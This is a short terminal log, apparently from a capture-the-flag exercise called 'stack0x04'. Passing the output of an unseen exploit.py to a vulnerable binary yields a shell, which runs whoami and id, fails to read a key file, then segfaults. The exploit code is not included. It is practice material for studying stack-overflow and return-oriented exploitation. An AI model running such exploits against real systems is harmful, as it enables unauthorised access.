s2ctf stack0x04 invocation

```
➜  ctf git:(ret2libc_and_returnorientedprogramming) ✗ ./stack0x04 $(python3 exploit.py)
$ whoami
rherna70
$ id
uid=1001(rherna70) gid=1001(rherna70) groups=1001(rherna70),27(sudo)
$ cat /ctf/key4
cat: /ctf/key4: Permission denied
$ exit
[1]    33235 segmentation fault (core dumped)  ./stack0x04 $(python3 exploit.py)
➜  ctf git:(ret2libc_and_returnorientedprogramming) ✗
```

